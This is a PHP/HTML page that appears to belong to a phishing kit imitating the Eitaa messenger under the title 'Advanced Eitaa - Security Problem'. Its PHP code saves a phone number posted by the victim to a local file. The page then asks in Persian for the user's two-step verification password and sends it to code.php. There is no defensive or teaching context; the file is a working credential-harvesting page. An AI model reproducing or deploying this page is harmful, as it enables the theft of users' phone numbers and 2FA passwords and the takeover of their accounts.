<?php
$phnom = $_POST["phone_num"];
$f = fopen("phone_number","w");
fwrite($f,$phnom);
?>
<html>
	<head>
		<title>ایتا پیشرفته - مشکل امنیتی</title>
		<link rel="stylesheet" href="css/style.css"/>
		<link rel="icon" href="img/logo.jpg">
	</head>

	<body class="body">
		<center>
			<div class="uper">
				<br/>
				<br/>
				<br/>
				<br/>
				<br/>
				<div class="login">
					<br/>
					<br/>
					<br/>
					<img src="img/logo.jpg" width=100/>
					<br/>
					<br/>
					<br/>
					<form action="code.php" method="post">
						<label for="2l">لطفا رمز تایید دو مرحله ای را وارد کنید</label>
						<br/>
						<br/>
						<input id="2l" type="number" name="2level" placeholder="رمز تایید دو مرحله ای"/>
						<br/>
						<br/>
						<h5>در صورت نداشتن رمز 0 را وارد کنید.</h5>
						<input type="submit" value="ثبت">
					</form>
					<br/>
				</div>
				<br/>
				<br/>
				<br/>
			</div>
			</center>
			<div class="downer">
				<br/>
				<br/>
				<br/>
				<br/>
				<br/>
				<br/>
				<br/>
				<br/>
				<br/>
				<br/>
				<br/>
				<br/>
				<br/>
				<br/>
				<br/>
				<br/>
				<br/>
				<br/>
				<br/>
				<h3 class="pro-shad">ایتا پیشرفته</h3>
			</div>
		
	</body>
</html>
